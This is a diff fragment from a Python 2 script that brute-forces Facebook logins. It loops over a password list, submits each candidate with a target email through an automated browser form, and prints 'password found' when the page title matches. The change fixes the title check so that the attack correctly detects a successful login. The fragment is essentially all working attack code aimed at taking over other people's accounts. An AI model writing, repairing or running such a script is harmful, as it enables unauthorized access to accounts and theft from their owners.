@@ -11,7 +11,7 @@ for x in pw:
 	b.form["email"]=email
 	b.form["pass"]=x
 	b.submit 
-	if b.title =="Facebook":
+	if b.title() =="Facebook":
 		print "password found : "+x
 		break;
 	else:
